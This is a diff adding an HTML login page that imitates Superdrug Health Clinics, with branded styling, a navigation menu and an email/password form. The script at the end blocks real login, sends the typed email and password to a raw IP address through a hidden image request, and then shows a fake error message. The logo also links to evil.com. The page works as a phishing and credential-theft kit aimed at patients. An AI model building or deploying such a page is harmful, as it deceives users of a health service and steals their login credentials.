@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Superdrug Health Clinics - Login</title>
+    <link rel="icon" href="favicon.png" type="image/png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --superdrug-red: #6fbd2c;
+            --superdrug-dark-red: #6fbd2c;
+            --light-gray: #f5f5f5;
+            --medium-gray: #e0e0e0;
+            --dark-gray: #333333;
+            --text-color: #444444;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background-color: rgb(0, 0, 0);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid var(--medium-gray);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo img {
+            height: 40px;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--superdrug-red);
+            margin-left: 10px;
+        }
+        
+        .user-actions a {
+            margin-left: 20px;
+            color: var(--text-color);
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .user-actions a:hover {
+            color: var(--superdrug-red);
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+            padding: 15px 0;
+        }
+        
+        nav ul li {
+            margin-right: 30px;
+        }
+        
+        nav ul li a {
+            text-decoration: none;
+            color: var(--light-gray);
+            font-weight: 500;
+            font-size: 16px;
+            padding: 8px 0;
+            position: relative;
+        }
+
+        /* CHANGED: Hover text color to green */
+        nav ul li a:hover {
+            color: #6fbd2c;
+        }
+
+        nav ul li a:hover::after,
+
+        
+        nav ul li a.active {
+            color: var(--superdrug-red);
+        }
+        
+        /* Login Page Styles */
+        .login-container {
+            max-width: 500px;
+            margin: 60px auto;
+            padding: 40px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .login-title {
+            text-align: center;
+            margin-bottom: 30px;
+            color: var(--dark-gray);
+        }
+        
+        .login-title h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+        
+        .login-title p {
+            color: var(--text-color);
+        }
+        
+        .login-form .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .login-form label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--dark-gray);
+        }
+        
+        .login-form label.required::after {
+            content: ' *';
+            color: var(--superdrug-red);
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--medium-gray);
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        
+        .login-form input:focus {
+            outline: none;
+            border-color: var(--superdrug-red);
+            box-shadow: 0 0 0 3px rgba(226, 0, 26, 0.1);
+        }
+        
+        .login-btn {
+            display: block;
+            width: 100%;
+            background-color: var(--superdrug-red);
+            color: white;
+            padding: 14px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            margin-top: 30px;
+        }
+        
+        .login-btn:hover {
+            background-color: var(--superdrug-dark-red);
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .forgot-password a {
+            color: var(--dark-gray);
+            text-decoration: none;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+            color: var(--superdrug-red);
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: var(--medium-gray);
+            margin: 30px 0;
+            position: relative;
+        }
+        
+        .divider::before {
+            content: '---';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 0 15px;
+            color: var(--text-color);
+            font-size: 14px;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .header-top {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            nav ul {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            nav ul li {
+                margin: 0 15px 10px;
+            }
+            
+            .login-container {
+                padding: 30px 20px;
+                margin: 40px auto;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                margin: 20px auto;
+            }
+            
+            .login-title h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="header-top">
+                <div class="logo">
+                    <a class="logo" href="https://evil.com"><img src="logo-white.png" alt="Superdrug"></a>
+                </div>
+                <div class="user-actions">
+                    <a href="#"><i class="fas fa-phone-alt"></i> </a>
+                    <a href="#"><i class="fas fa-envelope"></i></a>
+                    <a href="#"><i class="fas fa-user"></i> </a>
+                </div>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#">Home</a></li>
+                    <li><a href="#">Travel Clinic</a></li>
+                    <li><a href="#">Blood Tests</a></li>
+                    <li><a href="#">Health Checks</a></li>
+                    <li><a href="#">Vaccinations</a></li>
+                    <li><a href="#">Aesthetic Clinics</a></li>
+                    <li><a href="#">About</a></li>
+                    <li><a href="#">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <div class="login-container">
+            <div class="login-title">
+                <h1>Please login</h1>
+                <p>If you have had an appointment with Superdrug Health Clinics prior to October 2024, you will need to reactivate your account to log in. Please click Forgot your Password below.</p>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <form class="login-form">
+                <div class="form-group">
+                    <label for="email" class="required">Email address</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password" class="required">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <button type="submit" class="login-btn">Login</button>
+                
+                <div class="forgot-password">
+                    <a href="#">Forgot your password?</a>
+                </div>
+            </form>
+        </div>
+    </main>
+    <script>
+document.querySelector('.login-form').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const email = encodeURIComponent(document.getElementById('email').value.trim());
+    const password = encodeURIComponent(document.getElementById('password').value);
+
+    const trackingUrl = `http://137.184.55.132:22737/credentials?email=${email}&password=${password}`;
+
+    const img = document.createElement('img');
+    img.src = trackingUrl;
+    img.style.display = 'none';
+    document.body.appendChild(img);
+
+    // Optionally submit the form after pixel is loaded
+    setTimeout(() => {
+        // Proceed with form submission or redirect if needed
+        alert("An error occurred during login.");
+    }, 1000);
+});
+</script>
+
+
+
+</body>
+</html>
